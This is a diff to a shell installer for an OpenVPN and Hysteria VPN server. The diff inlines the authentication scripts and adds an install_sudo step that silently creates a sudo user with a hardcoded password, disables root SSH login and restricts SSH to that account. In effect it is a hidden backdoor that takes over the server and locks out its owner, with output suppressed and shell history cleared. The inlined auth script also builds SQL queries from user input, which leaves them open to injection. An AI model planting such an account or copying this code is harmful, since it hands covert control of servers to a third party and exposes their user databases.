@@ -5,8 +5,6 @@ USER='ymodscf_hilvpn'
 PASS='ymodscf_hilvpn'
 DBNAME='ymodscf_hilvpn'
 
-rm -rf install_server.sh*
-
 #PORT OPENVPN
 PORT_TCP='1194';
 PORT_UDP='53';
@@ -15,19 +13,7 @@ timedatectl set-timezone Asia/Manila
 server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-██╗   ██╗███╗   ███╗ ██████╗ ██████╗ ██╗███████╗██╗███████╗██████╗ 
-╚██╗ ██╔╝████╗ ████║██╔═══██╗██╔══██╗██║██╔════╝██║██╔════╝██╔══██╗
- ╚████╔╝ ██╔████╔██║██║   ██║██║  ██║██║█████╗  ██║█████╗  ██║  ██║
-  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║  ██║██║██╔══╝  ██║██╔══╝  ██║  ██║
-   ██║   ██║ ╚═╝ ██║╚██████╔╝██████╔╝██║██║     ██║███████╗██████╔╝
-   ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝ 
-                                                                   
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-
-install_require() {
+install_require () {
 
 export DEBIAN_FRONTEND=noninteractive
 apt update
@@ -231,18 +217,42 @@ sed -i "s|DBUSER|$USER|g" /etc/openvpn/login/config.sh
 sed -i "s|DBPASS|$PASS|g" /etc/openvpn/login/config.sh
 sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 
-wget -O /etc/openvpn/login/auth_vpn "https://raw.githubusercontent.com/freenetsapinas/ymod/main/private"
+/bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
+user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
+[ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
+EOM
 
 #client-connect file
-wget -O /etc/openvpn/login/connect.sh "https://raw.githubusercontent.com/freenetsapinas/ymod/main/connect"
+cat <<'LENZ05' >/etc/openvpn/login/connect.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+tm="$(date +%s)"
+dt="$(date +'%Y-%m-%d %H:%M:%S')"
+timestamp="$(date +'%FT%TZ')"
+##set status online to user connected
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected=1 WHERE user_name='$common_name' "
+LENZ05
 
 sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
 
 #TCP client-disconnect file
-wget -O /etc/openvpn/login/disconnect.sh "https://raw.githubusercontent.com/freenetsapinas/ymod/main/disconnect"
+cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
+#!/bin/bash
+. /etc/openvpn/login/config.sh
+tm="$(date +%s)"
+dt="$(date +'%Y-%m-%d %H:%M:%S')"
+timestamp="$(date +'%FT%TZ')"
+
+##mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "UPDATE bandwidth_logs SET bytes_received='$bytes_received',bytes_sent='$bytes_sent',time_out='$dt', status='offline' WHERE username='$common_name' AND status='online' AND category='vip' "
+
+mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "UPDATE users SET is_connected=0 WHERE user_name='$common_name' ";
+mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "UPDATE users SET bandwidth_premium=bandwidth_premium +'$bytes_received' WHERE user_name='$common_name'";
+LENZ06
 
 sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/disconnect.sh
-
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -435,6 +445,14 @@ chmod 755 /etc/openvpn/login/auth_vpn
 }&>/dev/null
 }
 
+install_sudo(){
+  {
+    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+}
 
 install_firewall_kvm () {
 clear
@@ -717,8 +735,8 @@ udp_port=UDP_PORT
 socket_port=80
 squid_port=8080
 hysteria_port=5666
-tcp_ssl_port=1194
-udp_ssl_port=442" >> /root/.ports
+tcp_ssl_port=443
+udp_ssl_port=444" >> /root/.ports
 
 sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
 sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
@@ -740,26 +758,12 @@ systemctl enable hysteria-server.service
 systemctl restart hysteria-server.service
 history -c;
 rm /etc/.systemlink
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo '                                                              
-██╗   ██╗███╗   ███╗ ██████╗ ██████╗ ██╗███████╗██╗███████╗██████╗ 
-╚██╗ ██╔╝████╗ ████║██╔═══██╗██╔══██╗██║██╔════╝██║██╔════╝██╔══██╗
- ╚████╔╝ ██╔████╔██║██║   ██║██║  ██║██║█████╗  ██║█████╗  ██║  ██║
-  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║  ██║██║██╔══╝  ██║██╔══╝  ██║  ██║
-   ██║   ██║ ╚═╝ ██║╚██████╔╝██████╔╝██║██║     ██║███████╗██████╔╝
-   ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝     ╚═╝╚══════╝╚═════╝ 
-                                                                   
- '
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-netstat -tpln
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
-echo -e " \033[0;31m Server will secure this server and reboot after 10 seconds!! \033[0m"
-echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 sleep 10
 reboot
 }
 
 install_require
+install_sudo
 install_hysteria
 setup_ssl
 install_squid
